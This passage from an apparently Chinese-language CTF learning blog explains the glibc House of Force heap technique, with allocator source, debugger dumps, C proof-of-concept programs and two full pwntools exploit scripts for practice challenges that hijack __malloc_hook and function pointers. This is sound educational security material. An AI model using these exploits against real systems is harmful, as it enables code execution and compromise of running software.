\</span></span><br><span class="line"><span class="meta">         ? MINSIZE                                                             \</span></span><br><span class="line"><span class="meta">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*  Same, except also perform argument check */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> checked_request2size(req, sz)                                          \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (REQUEST_OUT_OF_RANGE(req)) &#123;                                           \</span></span><br><span class="line"><span class="meta">        __set_errno(ENOMEM);                                                   \</span></span><br><span class="line"><span class="meta">        return 0;                                                              \</span></span><br><span class="line"><span class="meta">    &#125;                                                                          \</span></span><br><span class="line"><span class="meta">    (sz) = request2size(req);</span></span><br></pre></td></tr></table></figure>

<p>一方面，我们需要绕过 REQUEST_OUT_OF_RANGE(req) 这个检测，即我们传给 malloc 的值在负数范围内，不得大于 -2 * MINSIZE，这个一般情况下都是可以满足的。</p>
<p>另一方面，在满足对应的约束后，我们需要使得 <code>request2size</code>正好转换为对应的大小，也就是说，我们需要使得 ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK 恰好为 - 4112。首先，很显然，-4112 是 chunk 对齐的，那么我们只需要将其分别减去 SIZE_SZ，MALLOC_ALIGN_MASK 就可以得到对应的需要申请的值。其实我们这里只需要减 SIZE_SZ 就可以了，因为多减的 MALLOC_ALIGN_MASK 最后还会被对齐掉。而<strong>如果 -4112 不是 MALLOC_ALIGN 的时候，我们就需要多减一些了。当然，我们最好使得分配之后得到的 chunk 也是对齐的，因为在释放一个 chunk 的时候，会进行对齐检查。</strong></p>
<p>因此，我们当调用<code>malloc(-4120)</code>之后，我们可以观察到 top chunk 被抬高到我们想要的位置</p>
<hr>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p main_arena</span><br><span class="line"><span class="variable">$2</span> = &#123;</span><br><span class="line">  mutex = 0,</span><br><span class="line">  flags = 1,</span><br><span class="line">  fastbinsY = &#123;0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0&#125;,</span><br><span class="line">  top = 0x601010,</span><br><span class="line">  last_remainder = 0x0,</span><br><span class="line">......</span><br><span class="line">pwndbg&gt; top_chunk</span><br><span class="line">PREV_INUSE</span><br><span class="line">Addr: 0x601010</span><br><span class="line">Size: 0x1009</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/24gx 0x601010</span><br><span class="line">0x601010:       0x00007ffff7deef10      0x0000000000001009 &lt;== top_chunk</span><br><span class="line">0x601020 &lt;malloc@got.plt&gt;:      0x00007ffff7a91180      0x0000000000000000</span><br><span class="line">0x601030:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x601040:       0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这个0x1009 可以按源码算出来： (-1) - ((-4120) + 0x10) &#x3D; 0x1009</p>
<p>remainder_size &#x3D; size - nb; size &#x3D; -1; nb &#x3D; (unsigned long)(requst_size) + (pre_size + size); 其中-1和-4120被转化为unsigned long</p>
</blockquote>
<p>之后，我们分配的块就会出现在 0x601010+0x10 的位置，也就是 0x601020 可以更改 got 表中的内容了。</p>
<p>但是需要注意的是，在被抬高的同时，malloc@got 附近的内容也会被修改。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">set_head(victim, nb | PREV_INUSE |</span><br><span class="line">        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br></pre></td></tr></table></figure>

<p>执行过malloc(0x10)，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/24gx 0x601000</span><br><span class="line">0x601000:       0x0000000000600e28      0x00007ffff7ffe168</span><br><span class="line">0x601010:       0x00007ffff7deef10      0x0000000000000021 &lt;== malloc(0x10)得到的</span><br><span class="line">0x601020 &lt;malloc@got.plt&gt;:      0x00007ffff7a91180      0x0000000000000000</span><br><span class="line">0x601030:       0x0000000000000000      0x0000000000000fe9 &lt;== top_chunk</span><br><span class="line">0x601040:       0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<h2 id="向后控制内存demo2"><a href="#向后控制内存demo2" class="headerlink" title="向后控制内存demo2"></a>向后控制内存demo2</h2><p>在上一个示例中，我们演示了如何修改 <code>top_chunk</code> 使得 <code>top_chunk</code> 指针减小来修改其上面（低地址）的 <code>got</code> 表中的内容。同样，利用这种方式可以修改其下面（高地址）的内容。这次同样的利用代码进行演示：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> *ptr,*ptr2;</span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    ptr=(<span class="type">long</span> *)(((<span class="type">long</span>)ptr)+<span class="number">24</span>);</span><br><span class="line">    *ptr=<span class="number">-1</span>;                 <span class="comment">//&lt;=== 修改top chunk size</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">140737345551056</span>); <span class="comment">//&lt;=== 增大top chunk指针</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以看到程序代码与简单示例 1 基本相同，除了第二次 malloc 的 size 有所不同。 这次我们的目标是 malloc_hook，我们知道 malloc_hook 是位于 libc.so 里的全局变量值，首先查看内存布局：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">             Start                End Perm     Size Offset File</span><br><span class="line">          0x400000           0x401000 r-xp     1000      0 /home/ctf/pwn/demo2</span><br><span class="line">          0x600000           0x601000 r--p     1000      0 /home/ctf/pwn/demo2</span><br><span class="line">          0x601000           0x602000 rw-p     1000   1000 /home/ctf/pwn/demo2</span><br><span class="line">          0x602000           0x623000 rw-p    21000      0 [heap]</span><br><span class="line">    0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000      0 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7bcd000     0x7ffff7dcd000 ---p   200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7dcd000     0x7ffff7dd1000 r--p     4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7dd1000     0x7ffff7dd3000 rw-p     2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7dd3000     0x7ffff7dd7000 rw-p     4000      0 [anon_7ffff7dd3]</span><br><span class="line">    0x7ffff7dd7000     0x7ffff7dfd000 r-xp    26000      0 /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7fec000     0x7ffff7fef000 rw-p     3000      0 [anon_7ffff7fec]</span><br><span class="line">    0x7ffff7ff6000     0x7ffff7ffa000 r--p     4000      0 [vvar]</span><br><span class="line">    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000      0 [vdso]</span><br><span class="line">    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000  25000 /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000  26000 /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000      0 [anon_7ffff7ffe]</span><br><span class="line">    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]</span><br></pre></td></tr></table></figure>

<p>可以看到 heap 的基址在 0x602000，而 libc 的基址在 0x7ffff7a0d000，因此我们需要通过 HOF 扩大 top chunk 指针的值来实现对 malloc_hook 的写。 首先，由调试得知 __malloc_hook 的地址位于 0x7ffff7dd1b10 ，采取计算</p>
<p><code>0x7ffff7dd1b00-0x602020-0x10=140737345551056 </code>经过这次 malloc 之后，我们可以观察到 top chunk 的地址被抬高到了 0x00007ffff7dd1b00</p>
<p>执行过malloc(140737345551056);</p>
<p>通过 <code>p main_arena</code>或<code>top_chunk</code>等来查看top_chunk的位置，如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; top_chunk</span><br><span class="line">PREV_INUSE</span><br><span class="line">Addr: 0x7ffff7dd1b10</span><br><span class="line">Size: 0xffff800008830509</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/24gx 0x7ffff7dd1b10</span><br><span class="line">0x7ffff7dd1b10 &lt;__malloc_hook&gt;: 0x0000000000000000      0xffff800008830509</span><br><span class="line">0x7ffff7dd1b20 &lt;main_arena&gt;:    0x0000000100000000      0x0000000000000000</span><br><span class="line">0x7ffff7dd1b30 &lt;main_arena+16&gt;: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>之后，我们只要再次分配就可以控制 0x7ffff7dd1b10 处的 __malloc_hook 值了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rax = 0x00007ffff7dd1b10</span><br><span class="line"></span><br><span class="line">0x400562 &lt;main+60&gt;        mov    edi, 0x10</span><br><span class="line">0x400567 &lt;main+65&gt;        call   0x400410 &lt;malloc@plt&gt;</span><br></pre></td></tr></table></figure>

<h2 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h2><p>在这一节中讲解了 House Of Force 的原理并且给出了两个利用的简单示例，通过观察这两个简单示例我们会发现其实 HOF 的利用要求还是相当苛刻的。</p>
<ul>
<li>首先，需要存在漏洞使得用户能够控制 top chunk 的 size 域。</li>
<li>其次，<strong>需要用户能自由控制 malloc 的分配大小</strong></li>
<li>第三，分配的次数不能受限制</li>
</ul>
<p>其实这三点中第二点往往是最难办的，CTF 题目中往往会给用户分配堆块的大小限制最小和最大值使得不能通过 HOF 的方法进行利用。</p>
<p>公式为： <code>malloc(size)</code> 中的 <code>size=new_top_chunk_addr-old_top_chunk_addr-0x10</code>  </p>
<ul>
<li><code>new_top_chunk_addr</code> 为要转移 <code>top_chunk</code> 的目标地址。  </li>
<li><code>old_top_chunk_addr</code> 为已经被篡改的 <code>top_chunk</code> 地址。</li>
<li>new_top_chunk_addr &#x3D; target_addr - 0x10</li>
</ul>
<h1 id="top-chunk-attack的利用"><a href="#top-chunk-attack的利用" class="headerlink" title="top chunk attack的利用"></a>top chunk attack的利用</h1><h2 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a>house of force</h2><p>利用溢出等漏洞，将top chunk的size修改为-1，转换为无符号数就是最大值，然后通过malloc(offset)，即可将top chunk转移到目标地址，比如malloc_hook等，然后，再次malloc，就可控制目标地址处的数据（此图中的addr1已是old_top_chunk_addr - 0x10）。</p>
<p><img data-src="/../images/image-20250409132924240.png" alt="image-20250409132924240"></p>
<p>不仅可以malloc正数，还可以malloc(负数)使得top chunk上移到程序里的got表等。</p>
<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="type">char</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">   <span class="type">char</span> *top_chunk_addr = p1 + <span class="number">0x10</span>;</span><br><span class="line">   *(<span class="type">size_t</span> *)(top_chunk_addr + <span class="number">0x8</span>) = <span class="number">-1</span>; <span class="comment">//修改top chunk的size</span></span><br><span class="line">   <span class="type">size_t</span> offset = buf - p1 - <span class="number">0x30</span>;<span class="comment">//(buf-0x10) - (p1+0x10) - 0x10</span></span><br><span class="line">   <span class="built_in">malloc</span>(offset);</span><br><span class="line">    </span><br><span class="line">   <span class="type">char</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">   <span class="built_in">strcpy</span>(p2,<span class="string">&quot;hello,welcome to pwn\n&quot;</span>);</span><br><span class="line">   write(<span class="number">1</span>,buf,<span class="built_in">strlen</span>(buf));</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="无free得到unsortedbin"><a href="#无free得到unsortedbin" class="headerlink" title="无free得到unsortedbin"></a>无free得到unsortedbin</h2><p>前面，我们分析到，如果想要的size大于top chunk的size，并且size在mmap阈值之下，那么就会申请新的top chunk，将旧的top chunk给free掉，我们可以利用这个free来得到unsorted bin。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Record incoming configuration of top */</span></span><br><span class="line"></span><br><span class="line">old_top = av-&gt;top;</span><br><span class="line">old_size = chunksize (old_top);</span><br><span class="line">old_end = (<span class="type">char</span> *) (chunk_at_offset (old_top, old_size));<span class="comment">//*</span></span><br><span class="line"></span><br><span class="line">brk = snd_brk = (<span class="type">char</span> *) (MORECORE_FAILURE);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If not the first time through, we require old_size to be</span></span><br><span class="line"><span class="comment">   at least MINSIZE and to have prev_inuse set.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">        ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         prev_inuse (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="type">unsigned</span> <span class="type">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));<span class="comment">//*页检查</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Precondition: not enough current space to satisfy nb request */</span></span><br><span class="line">assert ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE));</span><br></pre></td></tr></table></figure>

<p>Top chunk的size不是随便改变某个值，想要验证检查，其中这里是页对齐检查，也就是说top_chunk_addr + size的值低12bit为0。</p>
<p>系统分配时的top chunk一般是页对齐的，一般情况下在改size时只需要将高位置零，低位不变即可。</p>
<h3 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="type">char</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">   <span class="type">char</span> *top_chunk_addr = p1 + <span class="number">0x10</span>;</span><br><span class="line">   *(<span class="type">size_t</span> *)(top_chunk_addr + <span class="number">0x8</span>) = <span class="number">0xFE1</span>; <span class="comment">//修改top chunk的size，注意页对齐</span></span><br><span class="line">   <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">   read(<span class="number">0</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="/../images/image-20250409152243476.png" alt="image-20250409152243476"></p>
<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="hitcon-lab11"><a href="#hitcon-lab11" class="headerlink" title="hitcon lab11"></a>hitcon lab11</h2><p>越看越熟悉，这不是我学习unlink时的例题吗 ^_^</p>
<p>house_of_force思路：</p>
<ol>
<li>溢出改top_chunk为 -1</li>
<li>house_of_force 将 top_chunk 迁移至hello_message()和goodbye_messgae()所在的结构体</li>
<li>将这goodbye_message()函数改为magic()函数，即可拿flag</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># time: 2025-04-09 18:32:41</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>, )</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">length,name</span>):</span><br><span class="line">    ru(<span class="string">b&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;Please enter the length of item name:&#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(length))</span><br><span class="line">    ru(<span class="string">b&#x27;Please enter the name of item:&#x27;</span>)</span><br><span class="line">    sl(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    ru(<span class="string">b&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,length,name</span>):</span><br><span class="line">    ru(<span class="string">b&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(idx))</span><br><span class="line">    ru(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(length))</span><br><span class="line">    ru(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    sl(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    ru(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x400d49</span></span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x48</span> + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(-<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,p64(magic)*<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">b&#x27;Your choice:&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<p>ubuntu16.04，glibc2.23</p>
<p>结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    b<span class="string">&#x27;5\n&#x27;</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">invaild choice!!!</span><br><span class="line">----------------------------</span><br><span class="line">Bamboobox Menu</span><br><span class="line">----------------------------</span><br><span class="line">1.show the items <span class="keyword">in</span> the box</span><br><span class="line">2.add a new item</span><br><span class="line">3.change the item <span class="keyword">in</span> the box</span><br><span class="line">4.remove the item <span class="keyword">in</span> the box</span><br><span class="line">5.<span class="built_in">exit</span></span><br><span class="line">----------------------------</span><br><span class="line">Your choice:[*] Process <span class="string">&#x27;./pwn&#x27;</span> stopped with <span class="built_in">exit</span> code 0 (pid 1162)</span><br><span class="line">[DEBUG] Received 0x15 bytes:</span><br><span class="line">    b<span class="string">&#x27;flah&#123;house_of_force&#125;\n&#x27;</span></span><br><span class="line">flah&#123;house_of_force&#125;</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$    </span><br></pre></td></tr></table></figure>

<h2 id="force"><a href="#force" class="headerlink" title="force"></a>force</h2><p><a href="https://github.com/le0n-daily/profile/blob/main/pwn/force">i春秋新春战疫之force</a></p>
<p>漏洞点：</p>
<p><img data-src="/../images/image-20250410184421781.png" alt="image-20250410184421781"></p>
<ul>
<li>只有add()函数有用</li>
<li>malloc(input)，这个input无检查，可负可非常大</li>
<li>read()中有溢出，可在add()时就溢出</li>
</ul>
<p>思路(house_of_force)：</p>
<ol>
<li>利用mmap的阈值分配机制得到libc_base</li>
<li>house_of_force 改 top_chunk 大小 -1，分配到堆块可以改 realloc_hook 和 malloc_hook</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># time: 2025-04-09 18:32:41</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./force&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>, )</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;2:puts&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;size&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    ru(<span class="string">b&#x27;bin addr &#x27;</span>)</span><br><span class="line">    <span class="comment"># data = int(rl().split()[0])</span></span><br><span class="line">    data = <span class="built_in">int</span>(ru(<span class="string">&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;content&#x27;</span>,content)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="comment">#通过mmap一个堆，我们得到了mmap的堆的地址，就能计算出libc地址</span></span><br><span class="line"><span class="comment">#因为mmap的这个堆靠近libc的地址</span></span><br><span class="line">libc_base = add(<span class="number">0x200000</span>,<span class="string">b&#x27;aaaa&#x27;</span>) + <span class="number">0x200ff0</span></span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">gadget = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">one = libc_base + gadget[<span class="number">0</span>]</span><br><span class="line">realloc_hook = libc_base + libc.sym[<span class="string">&#x27;__realloc_hook&#x27;</span>]</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"><span class="comment">#house of force</span></span><br><span class="line"><span class="comment">#修改top chunk的size为-1，即超级大</span></span><br><span class="line">heap = add(<span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span> + p64(<span class="number">0xffffffffffffffff</span>))</span><br><span class="line">leak(<span class="string">&#x27;heap&#x27;</span>,heap)</span><br><span class="line">top_chunk = heap + <span class="number">0x10</span></span><br><span class="line">leak(<span class="string">&#x27;one&#x27;</span>,one)</span><br><span class="line">leak(<span class="string">&#x27;realloc_hook&#x27;</span>,realloc_hook)</span><br><span class="line">leak(<span class="string">&#x27;malloc_hook&#x27;</span>,malloc_hook)</span><br><span class="line"><span class="comment">#分配偏移大小的chunk，将top chunk移到了malloc_hook_addr - 0x20处</span></span><br><span class="line">offset = malloc_hook - <span class="number">0x20</span> - top_chunk - <span class="number">0x10</span></span><br><span class="line">add(offset,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#写 realloc_hook 和 malloc_hook</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(one) + p64(realloc_hook+<span class="number">4</span>) </span><br><span class="line">add(<span class="number">0x10</span>,payload)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;2:puts&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;size&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

